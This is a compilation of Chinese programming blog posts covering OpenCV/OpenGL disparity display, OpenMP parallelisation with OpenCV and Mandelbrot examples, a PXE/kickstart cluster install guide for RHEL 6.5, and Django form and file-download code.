	glViewport (0, 0, (GLsizei)w, (GLsizei)h);
	glMatrixMode (GL_PROJECTION);
	glLoadIdentity ();
	gluPerspective (60, (GLfloat)w / (GLfloat)h, 1.0, 100.0);
	glMatrixMode (GL_MODELVIEW);
}

void displayDisparity(IplImage* disparity)
{
	double xyscale=100;
	int j=0;
	int i=0;
	CvScalar s;

	//accessing the image pixels
	for (i=0;i<h;i++)
	{
		for (j=0;j<w;j++)
		{
			s = cvGet2D(disparity,i,j);
			imgdata[i][j] = s.val[0];//for disparity is a grey image.
		}
	}
}
int main(int argc, char *argv)
{  
	cout << "OpenCV and OpenGL working together!"<<endl;
	//char* filename = "tsuDisparity.bmp;";

	string image_name;
	cout<<"input image name:"<<endl;
	cin>>image_name;
	IplImage* imgGrey = cvLoadImage(image_name.c_str(),0); //read image as a grey one
	if (imgGrey==NULL)
	{
		cout << "No valid image input."<<endl;
		char c=getchar();
		return 1;
	}
	w = imgGrey->width;
	h = imgGrey->height;

	displayDisparity(imgGrey);
	cvNamedWindow("original", CV_WINDOW_AUTOSIZE );
	cvShowImage("original", imgGrey );

	//------------------OpenGL-------------------------
	glutInit(&argc,(char**)argv);
	glutInitDisplayMode(GLUT_DEPTH | GLUT_SINGLE | GLUT_RGBA);
	glutInitWindowPosition(100,100);
	glutInitWindowSize(500,500);
	glutCreateWindow("3D disparity image");
	glutDisplayFunc(renderScene);
	glutReshapeFunc (reshape);

	glutMouseFunc(mouse);
	glutMotionFunc(motion);
	glutSpecialFunc(special);

	glutMainLoop();

	cvWaitKey(0);
	//release opencv stuff.
	cvReleaseImage(&imgGrey);
	cvDestroyWindow("Original");

	return 0;
}




 
 
效果如下：
 







    OpenMP2.5规范中，对于可以多线程执行的循环有如下5点约束：
1.循环语句中的循环变量必须是有符号整形，如果是无符号整形就无法使用，OpenMP3.0中取消了这个约束
2.循环语句中的比较操作必须是这样的样式：loop_variable <,<=,>,>=loop_invariant_interger
3.循环语句中必须是整数加，整数减，加减的数值必须是循环不变量
4.如果比较操作是《，《=，那么循环变量的值在每次迭代时候必须增加，反之亦然
5.循环必须是单入口，单出口，内部没有跳转语句

将循环多线程化所面临的挑战
1.循环迭代相关
因为OpenMP编译指导是对编译器发出的命令，所以编译器会将该循环编译成多线程代码，但由于循环迭代相关的存在，多线程代码将不能成功执行。

2.数据竞争


3.数据相关（以下假设为语句S2与语句S1存在数据相关）：
相关的种类（相关不等于循环迭代相关）：
1）流相关：S1先写某一存储单元，而后S2又读该单元
2）输出相关：两个语句写同一存储单元
3）反相关：一个语句先读一单元，然后另一语句写该单元
相关产生的方式：
1）S1在循环的一次迭代中访问存储单元L，S2在随后的一次迭代中访问L（是循环迭代相关）
2）S1和S2在同一循环迭代中访问同一存储单元L，但S1的执行在S2之前。（非循环迭代相关）

数据竞争：      数据竞争可能是由于输出相关引起的，编译器不会进行数据竞争的检测，Intel线程检测器可以检测数据竞争。用类似于互斥量的机制进行私有化和同步，可以消除数据竞争。#pragma omp parallel for private(x)       for(i=0;i<80;i++)       {         x=sin(i);         if(x>0.6)x=0.6;         printf("sin(%d)=%f\n",i,x);        }6.管理共享数据和私有数据：private:每个线程都拥有该变量的一个单独的副本，可以私有的访问         1）private：说明列表中的每个变量对于每个线程都应该有一个私有副本。这个私有副本用变量的默认值进行初始化         2）firstprivate:见13数据的Copy-in 和Copy-out         3）lastprivate:见13数据的Copy-in 和Copy-out         4）reduction:         5）threadprivate:指定由每个线程私有的全局变量有三种方法声明存储单元为私有：         1）使用private,firstprivate,lastprivate,reduction子句         2）使用threadprivate         3）在循环内声明变量，并且不使用static关键字shared:所有线程都能够访问该单元，并行区域内使用共享变量时，如果存在写操作，必须对共享变量加以保护default:并行区中所有变量都是共享的，除下列三种情况下：          1）在parallel for循环中，循环索引时私有的。          2）并行区中的局部变量是私有的          3）所有在private,firstprivate,lastprivate,reduction子句中列出的变量是私有的7.循环调度与分块     为了提供一种简单的方法以便能够在多个处理器之间调节工作负载，OpenMP给出了四种调度方案：static,dynamic,runtime,guided.     默认情况下，OpenMP采用静态平均调度策略，但是可以通过调用schedule(kind[,chunksize])子句提供循环调度信息如：#pragma omp for schedule (kind[,chunk-size])   //chunk-size为块大小guided根据环境变量里的设置来进行对前三种的调度在windows环境中，可以在”系统属性|高级|环境变量”对话框中进行设置环境变量。8.有效地使用归约：sum=0;for(k=0;k<100;k++){    sum=sum+func(k);}     为了完成这种形式的循环计算，其中的操作必须满足算术结合律和交换律，同时sum是共享的，这样循环内部都可以加给这个变量，同时又必须是私有的，以避免在相加时的数据竞争。reduction子句可以用来有效地合并一个循环中某些关于一个或多个变量的满足结合律的算术归约操作。reduction子句主要用来对一个或多个参数条目指定一个操作符，每个线程将创建参数条目的一个私有拷贝，在区域的结束处，将用私有拷贝的值通过指定的运行符运算，原始的参数条目被运算结果的值更新。sum=0;#pragma omp parallel for reduction(+:sum)for(k=0;k<100;k++){    sum=sum+func(k);}9.降低线程开销：当编译器生成的线程被执行时，循环的迭代将被分配给该线程，在并行区的最后，所有的线程都被挂起，等待共同进入下一个并行区、循环或结构化块。              如果并行区域、循环或结构化块是相邻的，那么挂起和恢复线程的开销就是没必要的。举例如下：                #pragma omp parallel //并行区内                {                   #pragma omp for // 任务分配for循环                          for(k=0;k<m;k++){                               fun1(k);                           }                   #pragma omp for                          for(k=0;k<m;k++){                               fun2(k);                           }                }10.任务分配区：     现实中应用程序的所有性能敏感的部分不是都在一个并行区域内执行，所以OpenMP用任务分配区这种结构来处理非循环代码。任务分配区可以指导OpenMP编译器和运行时库将应用程序中标示出的结构化块分配到用于执行并行区域的一组线程上。举例如下：              #pragma omp parallel //并行区内                {                   #pragma omp for // 任务分配for循环                          for(k=0;k<m;k++){                               fun1(k);                           }                   #pragma omp sections private(y,z)                     {                           #pragme omp section//任务分配section                               {y=sectionA(x);}                           #pragme omp section                               {z=sectionB(x);}                     }                                   }11.使用Barrier和Nowait:      栅障（Barrier）是OpenMP用于线程同步的一种方法。线程遇到栅障是必须等待，直到并行区中的所有线程都到达同一点。注意：在任务分配for循环和任务分配section结构中，我们已经隐含了栅障，在parallel,for,sections,single结构的最后，也会有一个隐式的栅障。隐式的栅障会使线程等到所有的线程继续完成当前的循环、结构化块或并行区，再继续执行后面的工作。可以使用nowait去掉这个隐式的栅障去掉隐式栅障，例如：                #pragma omp parallel //并行区内                {                   #pragma omp for nowait // 任务分配for循环                          for(k=0;k<m;k++){                               fun1(k);                           }                   #pragma omp sections private(y,z)                     {                           #pragme omp section//任务分配section                               {y=sectionA(x);}                           #pragme omp section                               {z=sectionB(x);}                     }                                   }     因为第一个 任务分配for循环和第二个任务分配section代码块之间不存在数据相关。加上显示栅障，例如：                              #pragma omp parallel shared(x,y,z) num_threads(2)//使用的线程数为2                               {                                   int tid=omp_get_thread_num();                                   if(tid==0)                                       y=fun1();//第一个线程得到y                                   else                                         z=fun2();//第二个线程得到z                                   #pragma omp barrier //显示加上栅障，保证y和z在使用前已有值                                   #pragma omp for                                           for(k=0;k<100;k++)                                                   x[k]=y+z;                               }12.单线程和多线程交错执行：      当开发人员为了减少开销而把并行区设置的很大时，有些代码很可能只执行一次，并且由一个线程执行，这样单线程和多线程需要交错执行举例如下：               #pragma omp parallel //并行区              {                    int tid=omp_get_thread_num();//每个线程都调用这个函数，得到线程号                     //这个循环被划分到多个线程上进行                      #pragma omp for nowait                      for(k=0;k<100;k++)                            x[k]=fun1(tid);//这个循环的结束处不存在使所有线程进行同步的隐式栅障                    #pragma omp master                      y=fn_input_only(); //只有主线程会调用这个函数                    #pragma omp barrier   //添加一个显示的栅障对所有的线程同步，从而确保x[0-99]和y处于就绪状态                     //这个循环也被划分到多个线程上进行                    #pragma omp for nowait                      for(k=0;k<100;k++)                         x[k]=y+fn2(x[k]); //这个线程没有栅障，所以不会相互等待                     //一旦某个线程执行完上面的代码，不需要等待就可以马上执行下面的代码                     #pragma omp single //注意：single后面意味着有隐式barrier                     fn_single_print(y);                      //所有的线程在执行下面的函数前会进行同步                     #pragma omp master                     fn_print_array(x);//只有主线程会调用这个函数              } 13.数据的Copy-in 和Copy-out:      在并行化一个程序的时候，一般都必须考虑如何将私有变量的初值复制进来（Copy-in ），以初始化线程组中各个线程的私有副本。在并行区的最后，还要将最后一次迭代/结构化块中计算出的私有变量复制出来（Copy-out），复制到主线程中的原始变量中。firstprivate:使用变量在主线程的值对其在每个线程的对应私有变量进行初始化。一般来说，临时私有变量的初值是未定义的。lastprivate:可以将最后一次迭代/结构化块中计算出来的私有变量复制出来，复制到主线程对应的变量中，一个变量可以同时用firstprivate和lastprivate来声明。copyin:将主线程的threadprivate变量的值复制到执行并行区的每个线程的threadprivate变量中。copyprivate:使用一个私有变量将某一个值从一个成员线程广播到执行并行区的其他线程。该子句可以关联single结构(用于single指令中的指定变量为多个线程的共享变量)，在所有的线程都离开该结构中的同步点之前，广播操作就已经完成。14.保护共享变量的更新操作：     OpenMP支持critical和atomic编译指导，可以用于保护共享变量的更新，避免数据竞争。包含在某个临界段且由atomic编译指导所标记的代码块可能只由一个线程执行。例如：#pragma omp critical　　　{              if(max<new_value) max=new_value;         }15.OpenMP库函数（#include <omp.h>）：int omp_get_num_threads(void); //获取当前使用的线程个数int omp_set_num_threads(int NumThreads);//设置要使用的线程个数int omp_get_thread_num(void);//返回当前线程号int omp_get_num_procs(void);//返回可用的处理核个数



下面我们来看一个具体的应用例，从硬盘读入两幅图像，对这两幅图像分别提取特征点，特征点匹配，最后将图像与匹配特征点画出来。理解该例子需要一些图像处理的基本知识，我不在此详细介绍。另外，编译该例需要opencv，我用的版本是2.3.1，关于opencv的安装与配置也不在此介绍。我们首先来看传统串行编程的方式。


#include "opencv2/highgui/highgui.hpp"
#include "opencv2/features2d/features2d.hpp"
#include <iostream>
#include <omp.h>
int main( ){
    cv::SurfFeatureDetector detector( 400 );    
    cv::SurfDescriptorExtractor extractor;
    cv::BruteForceMatcher<cv::L2<float> > matcher;
    std::vector< cv::DMatch > matches;
    cv::Mat im0,im1;
    std::vector<cv::KeyPoint> keypoints0,keypoints1;
    cv::Mat descriptors0, descriptors1;
    double t1 = omp_get_wtime( );
    //先处理第一幅图像
    im0 = cv::imread("rgb0.jpg", CV_LOAD_IMAGE_GRAYSCALE );
    detector.detect( im0, keypoints0);
    extractor.compute( im0,keypoints0,descriptors0);
    std::cout<<"find "<<keypoints0.size()<<"keypoints in im0"<<std::endl;
    //再处理第二幅图像
    im1 = cv::imread("rgb1.jpg", CV_LOAD_IMAGE_GRAYSCALE );
    detector.detect( im1, keypoints1);
    extractor.compute( im1,keypoints1,descriptors1);
    std::cout<<"find "<<keypoints1.size()<<"keypoints in im1"<<std::endl;
    double t2 = omp_get_wtime( );
    std::cout<<"time: "<<t2-t1<<std::endl;
    matcher.match( descriptors0, descriptors1, matches );
    cv::Mat img_matches;
    cv::drawMatches( im0, keypoints0, im1, keypoints1, matches, img_matches ); 
    cv::namedWindow("Matches",CV_WINDOW_AUTOSIZE);
    cv::imshow( "Matches", img_matches );
    cv::waitKey(0);
    return 1;
}




很明显，读入图像，提取特征点与特征描述子这部分可以改为并行执行，修改如下：


#include "opencv2/highgui/highgui.hpp"
#include "opencv2/features2d/features2d.hpp"
#include <iostream>
#include <vector>
#include <omp.h>
int main( ){
    int imNum = 2;
    std::vector<cv::Mat> imVec(imNum);
    std::vector<std::vector<cv::KeyPoint>>keypointVec(imNum);
    std::vector<cv::Mat> descriptorsVec(imNum);
    cv::SurfFeatureDetector detector( 400 );    cv::SurfDescriptorExtractor extractor;
    cv::BruteForceMatcher<cv::L2<float> > matcher;
    std::vector< cv::DMatch > matches;
    char filename[100];
    double t1 = omp_get_wtime( );
#pragma omp parallel for
    for (int i=0;i<imNum;i++){
        sprintf(filename,"rgb%d.jpg",i);
        imVec[i] = cv::imread( filename, CV_LOAD_IMAGE_GRAYSCALE );
        detector.detect( imVec[i], keypointVec[i] );
        extractor.compute( imVec[i],keypointVec[i],descriptorsVec[i]);
        std::cout<<"find "<<keypointVec[i].size()<<"keypoints in im"<<i<<std::endl;
    }
    double t2 = omp_get_wtime( );
    std::cout<<"time: "<<t2-t1<<std::endl;
    matcher.match( descriptorsVec[0], descriptorsVec[1], matches );
    cv::Mat img_matches;
    cv::drawMatches( imVec[0], keypointVec[0], imVec[1], keypointVec[1], matches, img_matches ); 
    cv::namedWindow("Matches",CV_WINDOW_AUTOSIZE);
    cv::imshow( "Matches", img_matches );
    cv::waitKey(0);
    return 1;
}






两种执行方式做比较，时间为：2.343秒v.s. 1.2441秒

在上面代码中，为了改成适合#pragma omp parallel for执行的方式，我们用了STL的vector来分别存放两幅图像、特征点与特征描述子，但在某些情况下，变量可能不适合放在vector里，此时应该怎么办呢？这就要用到openMP的另一个工具，section，代码如下：




#include "opencv2/highgui/highgui.hpp"
#include "opencv2/features2d/features2d.hpp"
#include <iostream>
#include <omp.h>
int main( ){
    cv::SurfFeatureDetector detector( 400 );    cv::SurfDescriptorExtractor extractor;
    cv::BruteForceMatcher<cv::L2<float> > matcher;
    std::vector< cv::DMatch > matches;
    cv::Mat im0,im1;
    std::vector<cv::KeyPoint> keypoints0,keypoints1;
    cv::Mat descriptors0, descriptors1;
    double t1 = omp_get_wtime( );
#pragma omp parallel sections
    {
#pragma omp section
        {
            std::cout<<"processing im0"<<std::endl;
            im0 = cv::imread("rgb0.jpg", CV_LOAD_IMAGE_GRAYSCALE );
            detector.detect( im0, keypoints0);
            extractor.compute( im0,keypoints0,descriptors0);
            std::cout<<"find "<<keypoints0.size()<<"keypoints in im0"<<std::endl;
        }
#pragma omp section
        {
            std::cout<<"processing im1"<<std::endl;
            im1 = cv::imread("rgb1.jpg", CV_LOAD_IMAGE_GRAYSCALE );
            detector.detect( im1, keypoints1);
            extractor.compute( im1,keypoints1,descriptors1);
            std::cout<<"find "<<keypoints1.size()<<"keypoints in im1"<<std::endl;
        }
    }
    double t2 = omp_get_wtime( );
    std::cout<<"time: "<<t2-t1<<std::endl;
    matcher.match( descriptors0, descriptors1, matches );
    cv::Mat img_matches;
    cv::drawMatches( im0, keypoints0, im1, keypoints1, matches, img_matches ); 
    cv::namedWindow("Matches",CV_WINDOW_AUTOSIZE);
    cv::imshow( "Matches", img_matches );
    cv::waitKey(0);
    return 1;
}





上面代码中，我们首先用#pragma omp parallel sections将要并行执行的内容括起来，在它里面，用了两个#pragma omp section，每个里面执行了图像读取、特征点与特征描述子提取。将其简化为伪代码形式即为：


 1 #pragma omp parallel sections 2 { 3     #pragma omp section 4     { 5         function1(); 6     } 7 　　#pragma omp section 8     { 9         function2();10     }11 }



意思是：parallel sections里面的内容要并行执行，具体分工上，每个线程执行其中的一个section，如果section数大于线程数，那么就等某线程执行完它的section后，再继续执行剩下的section。在时间上，这种方式与人为用vector构造for循环的方式差不多，但无疑该种方式更方便，而且在单核机器上或没有开启openMP的编译器上，该种方式不需任何改动即可正确编译，并按照单核串行方式执行。

以上分享了这两天关于openMP的一点学习体会，其中难免有错误，欢迎指正。另外的一点疑问是，看到各种openMP教程里经常用到private,shared等来修饰变量，这些修饰符的意义和作用我大致明白，但在我上面所有例子中，不加这些修饰符似乎并不影响运行结果，不知道这里面有哪些讲究。

在写上文的过程中，参考了包括以下两个网址在内的多个地方的资源，不再一 一列出，在此一并表示感谢。

http://blog.csdn.net/drzhouweiming/article/details/4093624
http://software.intel.com/zh-cn/articles/more-work-sharing-with-openmp


OpenMP嵌套并行：

http://blog.csdn.net/zhuxianjianqi/article/details/8287937


一些优秀博客的加速例子：


http://www.cnblogs.com/LBSer/p/4604754.html


http://www.cnblogs.com/louyihang-loves-baiyan/p/4913164.html



参考文献：

http://www.cnblogs.com/yangyangcv/archive/2012/03/23/2413335.html









在理想情况下，编译器使用自动并行化能够管理一切事务，使用OpenMP指令的一个优点是将并行性和算法分离，阅读代码时候无需考虑并行化是如何实现的。当然for循环是可以并行化处理的天然材料，满足一些约束的for循环可以方便的使用OpenMP进行傻瓜化的并行。

为了使用自动并行化对Mandelbrot集合进行计算，必须对代码进行内联：书中首次使用自动并行化时候，通过性能分析发现工作在线程中并未平均分配。

#include <stdio.h>
#include <malloc.h>
#define SIZE 4000

int inSet(double ix,double iy)
{
	int iterations = 0;
	double x = ix,y = iy;
	double x2 = x*x, y2 = y*y;

	while ((x2 + y2 < 4) && (iterations < 1000))
	{
		y = 2*x*y + iy;
		x = x2 -y2 +ix;
		x2 = x*x;
		y2 = y*y;
		iterations++;
	}

	return iterations;
}

int main()
{
	int *matrix[SIZE];
	for (int i = 0; i < SIZE; i++)
	{
		matrix[i] = (int* )malloc( SIZE*sizeof(int) );
	}

#pragma omp parallel for
	for (int x = 0 ;x <SIZE; x++)
	{
		for (int y =0;y <SIZE;y++)
		{
			double xv = ((double)x -(SIZE/2)) / (SIZE/4);
			double yv = ((double)y -(SIZE/2)) / (SIZE/4);
			matrix[x][y] = inSet(xv,yv);
		}
	}

	for (int x =0; x<SIZE;x++)
	{
		for (int y =0;y<SIZE;y++)
		{
			if (matrix[x][y] == -7)
			{
				printf(" ");
			}
		}
	}

	return 0;
}
    当我们看到 分形图的时候应该可以很快的理解负荷不均衡从那里产生，分形图中大部分点不在集合中，这部分点只需要少量的迭代就可以确定，但有些在集合中的点则需要大量的迭代。
     当然我再一次见识到了OpenMP傻瓜化的并行操作机制，纠正工作负荷不均衡只要更改并行代码调度子句就可以了，使用动态指导调度，下面代码是增加了OpenCV的显示部分：


#include "Fractal.h"
#include <Windows.h>
#include <omp.h>

int Fractal::Iteration(Complex a, Complex c)
{
	double maxModulus = 4.0;
	int maxIter = 256;
	int iter = 0;
	
	Complex temp(0,0) ;

	while ( iter < maxIter && a.modulus() < maxModulus)
	{
		a = a * a ;
		a += c;
		iter++;
	}
	return iter;
}

cv::Mat Fractal::generateFractalImage(Border border, CvScalar colortab[256] )
{
	cv::Size size(500,500);

	double xScale = (border.xMax - border.xMin) / size.width;
	double yScale = (border.yMax - border.yMin) / size.height;

	cv::Mat img(size, CV_8UC3);

#pragma omp parallel for schedule(dynamic)
	for (int y=0; y<size.height; y++)
	{
		for (int x=0; x<size.width; x++)
		{
			double cx = border.xMin + x * xScale;
			double cy = border.yMin + y * yScale;

			Complex a(0.0, 0.0);
			Complex c(cx, cy);
			int nIter ;

			if (type == MANDELBROT)
			{
				nIter = Iteration(a, c);
			}
			else if (type == JUALIA)
			{
				nIter = Iteration(c, offset);
			}

			int colorIndex =  (nIter) % 255;

			cv::Vec3b color;
			color.val[0] = colortab[colorIndex].val[0];
			color.val[1] = colortab[colorIndex].val[1];
			color.val[2] = colortab[colorIndex].val[2];
			img.at<cv::Vec3b>(y,x) = color;
		}
	}

	return img;
}

  #pragma omp parallel for schedule(dynamic) 子句


schedule子句：

　　schedule(type[, size])，

　　参数type是指调度的类型，可以取值为static，dynamic，guided，runtime四种值。其中runtime允许在运行时确定调度类型，因此实际调度策略只有前面三种。

　　参数size表示每次调度的迭代数量，必须是整数。该参数是可选的。当type的值是runtime时，不能够使用该参数。

动态调度dynamic

　　动态调度依赖于运行时的状态动态确定线程所执行的迭代，也就是线程执行完已经分配的任务后，会去领取还有的任务。由于线程启动和执行完的时间不确定，所以迭代被分配到哪个线程是无法事先知道的。

　　当不使用size 时，是将迭代逐个地分配到各个线程。当使用size 时，逐个分配size个迭代给各个线程。
动态调度迭代的分配是依赖于运行状态进行动态确定的，所以哪个线程上将会运行哪些迭代是无法像静态一样事先预料的。
加速结果：
1.放大加速结果


2.未加速时候的放到功能，基本是3-5倍这个水平，也就是相当于台式机cpu 的个数？本人的猜测

3.图像计算结果（未加速）

4. 动态加速结果


代码：http://download.csdn.net/detail/wangyaninglm/9516035

参考文献：

http://baike.baidu.com/view/1777568.htm?fromtitle=Mandelbrot%E9%9B%86%E5%90%88&fromid=1778748&type=syn
http://www.cnblogs.com/easymind223/archive/2013/01/19/2867620.html戈夫. 多核应用编程实战[M]. 人民邮电出版社, 2013.
http://openmp.org/mp-documents/OpenMP3.1-CCard.pdf
http://blog.csdn.net/gengshenghong/article/details/7000979









最近做一些集群的测试的工作，做服务器测试最根本就是要安装系统，曾经我们用十几个光驱并行安装光驱的日子过去了，自从有了pxe一两天搭建好一个集群不是梦！当然做多了集群的搭建工作最多的感受就是，其实运维工作谁都能做，关键是效率高不高的问题，pxe装机这个东西就是能极高提升我们效率的工具，下面我来分享一下整个搭建过程。
1. 基建工作
1.关闭防火墙

a)service iptables stop 
  b)service ip6tables stop 
  c)chkconfig iptables off 
  d)chkconfig ip6tables off

2.关闭SELinux
a)临时关闭SELinux(重启失效)：

setenforce 0

b)

/etc/selinux/cofig    disabled

2. 配置dhcp服务
1.将/usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample拷贝至/etc/dhcp/dhcpd.conf：

cp /usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample /etc/dhcp/dhcpd.conf

并修改dhcpd.conf的内容：


dns服务可以不配置；

2.确保开机启动dhcpd服务：

chkconfig dhcpd on

3.启动dhcpd服务：

service dhcpd start

4.检查dhcpd服务是否已启动：

ss -nul

如果发现67端口被监听，则表示成功；

3. 配置tftp服务
由于tftp是瞬时服务进程，不能进行自我管理，需要通过超级服务进程进行管理，所以安装tftp-server时，超级服务进程程序xinetd被依赖。
1.设置并确保xinetd开机启动：

chkconfig xinetd on

p.s. 如果没有tftp的话需要安装一下，执行yum –y search tftp查看系统是否安装tftp软件包，若没有安装，则执行yum –y install tftp tftp-service
2.启动xinetd服务：

service xinetd start

查看是否开机启动

chkconfig –list xinetd


3.检测xinetd服务是否已启动：

ss -nul

如果发现69端口被监听，则表示成功；
4.编辑/etc/xinetd.d/tftp文件，将”disable=yes”改为”disable=no”;
5.测试tftp服务：

a)新建test.txt，放到/var/lib/tftpboot/目录下，并在服务器本机进行测试。 
  b)切换到根目录下，执行 tftp 192.168.1.205(服务器地址): 
  tftp > get test.txt; 
  tftp > quit;

如果根目录下出现test.txt，则tftp服务搭建成功，删除测试文件test.txt;
4. 配置nfs服务
1.创建nfs目录：

mkdir /nfsroot

2.配置nfs服务：在/etc/exports末尾行中加入

/nfsroot *(rw,wdelay,crossmnt,insecure,root_squash,no_subtree_check,fsid=0) 
  并运行 
  exportfs –a #使配置生效；

3.启动rpcbind服务：

chkconfig rpcbind on 
  service rpcbind start

4.启动nfs服务：

chkconfig nfs on 
  service nfs start

5. 搭建本地yum源
1.挂在镜像文件rhel6.5.iso 到 /mnt:

mount -o loop /opt/rhel6.5.iso /mnt

2.cd 到/etc/yum.repos.d 目录下建立以”.repo”结尾的文件，这里我建立的是rhel65.repo，内容如下：

[rhel65] 
  name=rhel65 
  baseurl=file:///mnt 
  enabled=1 
  gpgcheck = 0 
   #gpgkey = http://yum.zb/rhel65/RPM-GPG-KEY-redhat-release

3.配置完成后用命令：

yum clean all #进行刷新

4.常用命令：

a)yum install package1 安装指定的安装包package1 
  b)yum groupinsall group1 安装程序组group1 
  c)yum update package1 更新指定程序包package1 
  d)yum check-update 检查可更新的程序 
  e)yum upgrade package1 升级指定程序包package1 
  f)yum groupupdate group1 升级程序组group1 
  g)yum info package1 显示安装包信息package1 
  h)yum list 显示所有已经安装和可以安装的程序包 
  i)yum list package1 显示指定程序包安装情况package1 
  j)yum remove  package1 删除程序包package1 
  k)yum groupremove group1 删除程序组group1

6. 制作kickstart.cfg文件
1.请先搭建本地yum源；
2.执行

system-config-kickstart

弹出kickstart.cfg制作界面。
3.Basic Configuration（基础配置）

4.Installation Method 安装方式
 
此处选择nfs方式： 
NFS Serve：nfs服务器ip 
NFS Directory：/nfsroot
5.Boot Loader Options 默认
6.配置分区信息
 
要指定分区，使用sda，其中/boot大小为200M，/的大小为剩余空间
7.Network Configuration 将网卡eth0 设置为dhcp模式

8.Authentication默认
9.Firewall Configuration 关闭防火墙，关闭selinux

10.Display Configuration默认
11.Package Selection 
如果没有包显示，请先搭建本地yum源，然后在选包；
12.Pre-Installation Script和Post-Installation Script均默认设置。
13.点击File–>Save–>修改文件名为centos-6.5-ks.cfg保存至/opt/ks.cfg(本人自定义目录）下；
7. 提供pxe工作环境
1.找到/usr/share/syslinux/pxelinux.0文件，并将其复制到/var/lib/tftpboot/目录下;
2.将系统镜像盘中pxe模式下专用的内核文件和initrd镜像文件复制到tftp服务器相应目录中:

3.将系统光盘镜像中的isolinux/目录下的boot.msg splash.jpg vesamenu.c32复制到/var/lib/tftpboot/目录下

4.将系统光盘镜像中的isolinux/目录下的isolinux.cfg文件拷贝至/var/lib/tftpboot/pxelinux.cfg/目录下，命名为default，用来引导客户端启动过程；并修改/var/lib/tftpboot/pxelinux/default文件，指定ks文件的加载位置；

5.将安装光盘里的images目录复制到/nfsroot目录下，并将RHEl 6.5的ISO文件复制到/nfsroot目录下
6.所需文件见文件夹。
ps：重启后的可以使用gdm命令切换桌面 









后面还有一个问题，是我把txt生成了，但是网页没有返回我还不知道，现在怎么直接返回txt并且展示出来txt 的内容，希望大牛不吝赐教

首先有一个问题
django1.7之前，这样用：

HttpResponse(simplejson.dumps({“status”: ‘200’, “message”:u’登录成功’}), mimetype=’application/json’)

没问题，但是django1,7之后就报错了，查了下问题发现应该这样用：

HttpResponse(simplejson.dumps({“status”: ‘200’, “message”:u’登录成功’}), 
content_type=’application/json’)

html模版：
<html>
<style type="text/css">
    {# <ul class="errorlist">。。。</ul> #}
    {# ul标签下的class="errorlist"的属性进行渲染 #}{# 标签下的属性 #}
    ul.errorlist {
        margin: 0;
        padding: 0;
    }
    {# <ul class="errorlist"><li>单词个数低于4个!</li></ul> #}
    {# errorlist class下的 li标签内的元素进行渲染 #}{# 属性下一级的标签 #}
    .errorlist li {
        background-color: red;
        color: white;
        display: block;
        font-size: 10px;
        margin: 0 0 3px;
        padding: 4px 5px;
    }
    .field{
        background-color:#BCD8F5;
    }
</style>
<head>
    <title>Contact us</title>
</head>
<body>

    {% if form.errors %}
        <p style="color: red;">
            Please correct the error{{ form.errors|pluralize }} below.
        </p>
    {% endif %}

    <form action="" method="post">
        <div class="field">
		This is a brief description of Interim Fix ：
            {# 自动生成的默认错误信息显示 #}
            {# 会被翻译成：<ul class="errorlist"><li>这个字段是必填项。</li></ul> #}
            {{ form.subject.errors }}
            <label for="id_subject">12</label>
            {{ form.subject }}
            {# 自定义的错误信息显示 #}
            {% if form.subject.errors%}
            <label for="id_self_def_error_info" style="color: red;">
                *自定义错误信息：主题不能为空
            </label>
            {% endif %}

        </div>
        <div class="field">
            {{ form.email.errors }}
            <label for="id_email"> for IBM SPSS Data Collection DDL 7 ("Software").</label>
            {{ form.email }}
        </div>
        <div class="field">
            {{ form.message.errors }}
            <label for="id_message">页面中自定义的信息:</label>
            {{ form.message }}
        </div>
        <input type="submit" value="提交">
    </form>
</body>
</html>


form.py
#coding： gb2312
from django import forms

class ContactForm(forms.Form):
    subject = forms.CharField(max_length=10,label='subject')#设置最大长度为10
    email = forms.EmailField(required=False,label='Email')#非必要字段
    message = forms.CharField(widget=forms.Textarea,label='message')#指定form中组件的类型

    #自定义校验规则，该方法在校验时被系统自动调用，次序在“字段约束”之后
    def clean_message(self):
        message = self.cleaned_data['message']#能到此处说明数据符合“字段约束”要求
        num_words = len(message.split())
        if num_words < 0:#单词个数
            raise forms.ValidationError("your word is too short!")
        return message



views.py

#coding： gb2312
from django.http import HttpResponse
import datetime,calendar
import time
from django.http import HttpResponse
from django.template import Context
from django.template.loader import get_template
from django.http import HttpResponse, Http404
from django.contrib.auth.models import User
from django.shortcuts import render_to_response
from django.http import HttpResponseRedirect
from django.contrib.auth import logout
from django.template import RequestContext
#from django import form

from django.shortcuts import render 
from .forms import ContactForm 
#from django.shortcuts import render_to_response
#from django_manage_app.forms import ContactForm

def current_datetime(request):
    now = time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time()))
    html = '<html><body>It is now %s.</body></html>' %now
    return HttpResponse(html)
    
def contact_author(request):
    if request.method == 'POST':#提交请求时才会访问这一段，首次访问页面时不会执行
        form = ContactForm(request.POST)
        if form.is_valid():#说明各个字段的输入值都符合要求
            cd = form.cleaned_data#只有各个字段都符合要求时才有对应的cleaned_data
            #print (form.cleaned_data())
            print (cd['subject'])
            print (cd['email'])
            print (cd['message'])
            return HttpResponseRedirect('/thanks/')
        else:#有部分字段不符合要求，会有error相关信息给加到form中去，需要覆盖掉
            #print (form)
            print ('The data does not meet the requirements')
            print (form['subject'].errors)
            print (form['email'].errors)
            print (form['message'].errors)
    else:#首次访问该url时没有post任何表单
        form = ContactForm()#第一次生成的form里面内容的格式
        print (form)
        print (form.is_valid())

    #“首次访问”和“提交的信息不符合要求”时被调用
    return render_to_response('contact_author.html', {'form': form})


def thanks(request):

    return render_to_response('thanks.html')
    
    
def download_file(request):   
    #from django.http import HttpResponse          
    ## CSV  
    #import csv      
    #response = HttpResponse(mimetype='text/csv')  
    #response['Content-Disposition'] = 'attachment; filename=my.csv'  
    #writer = csv.writer(response)  
    #writer.writerow(['First row', 'Foo', 'Bar', 'Baz'])  
    #writer.writerow(['Second row', 'A', 'B', 'C', '"Testing"', "Here's a quote"])  
 
    # Text file  #要是返回txt放开这部分代码 return response
    #response = HttpResponse(content_type="text/plain")                                   
    #response['Content-Disposition'] = 'attachment; filename=my.txt'                
    #response.write("aa/n")  
    #response.write("bb")   
     
    # PDF file   
    #http://code.djangoproject.com/svn/django/branches/0.95-bugfixes/docs/outputting_pdf.txt  
    #from reportlab.pdfgen import canvas  #need pip install reportlab
    #response = HttpResponse()#)mimetype='application/pdf')  
    #response['Content-Disposition'] = 'attachment; filename=somefilename.pdf'  
    #p = canvas.Canvas(response)  
    #p.drawString(100, 100, "Hello world.")  
    #p.showPage()  
    #p.save()  
    #response = HttpResponse()
